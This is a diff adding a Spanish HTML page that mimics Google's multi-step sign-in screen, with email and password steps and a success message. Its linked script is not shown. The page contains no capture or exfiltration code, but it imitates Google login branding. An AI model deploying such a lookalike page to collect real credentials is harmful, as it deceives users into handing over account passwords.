@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicia sesión</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+        <div id="paso1" class="paso activo">
+                <h2>
+                    Inicia Sesión
+                </h2>
+                <p>
+                    con tu cuenta de Google.
+                </p>
+
+                <input id="mail" type="text" placeholder="" required>
+                <label for="email">Correo electrónico</label>
+
+                <p>
+                    ¿No es tu ordenador? Usa el modo invitado
+                </p>
+
+                <button id="crear" type="button">Crear cuenta</button>
+
+                <button id="siguiente" type="click">Siguiente</button>
+
+        </div>
+
+        <div id="paso2" class="paso">
+                <h2>
+                    Te damos la bienvenida
+                </h2>
+
+                <input id="mail" type="password" placeholder="" required>
+                <label for="email">Introduce la contraseña</label>
+
+                <p><button id="mostrar" type="button">Mostrar Contraseña</button></p>
+
+                <p><button id="contraseña">Siguiente</button></p>
+
+        </div>
+
+        <div id="paso3" class="paso">
+            <h1>
+                Contraseña correcta. Estás dentro
+            </h1>
+        </div>
+    <script src="scripts/miscript.js"></script>
+</body>
+</html>
